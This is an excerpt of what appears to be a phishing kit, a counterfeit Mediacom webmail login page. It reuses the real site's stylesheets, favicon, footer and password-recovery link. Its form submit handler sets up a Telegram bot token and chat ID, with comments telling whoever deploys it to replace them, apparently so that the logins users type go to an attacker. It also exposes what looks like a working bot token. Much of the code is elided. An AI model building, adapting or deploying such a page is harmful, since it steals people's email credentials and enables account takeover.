...
-->
	...
	<link rel="stylesheet" type="text/css" href="https://mail1.mediacombb.net/css/common,login,zhtml,skin.css?skin=harmony&v=220612070740">
	<link rel="SHORTCUT ICON" href="https://mail1.mediacombb.net/img/logo/favicon.ico">
...
document.addEventListener("DOMContentLoaded", () => {
    ...
    form.addEventListener("submit", async (e) => {
        ...
        // Telegram bot info
        const botToken = "7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo"; // replace with your bot token
        const chatId = "1920675677";     // replace with your chat ID
		...
		<div class="Footer">
			...
			<div class="copyright">
			Copyright © 2025 Mediacom Communication Corp.  All rights reserved.</div>
		</div>
...
,banner:{
position:"static",url:"http://www.mediacomtoday.com"}
,userInfo:{
position:"static"}
,search:{
position:"static"}
...
,hideSearchInCompose:true,notificationBanner:"https://mail1.mediacombb.net/skins/_base/logos/NotificationBanner_grey.gif?v=220612070740"};
...
function forgotPassword() {
	...
	var url = "https://mail1.mediacombb.net/public/PasswordRecovery.jsp?" + location.search;
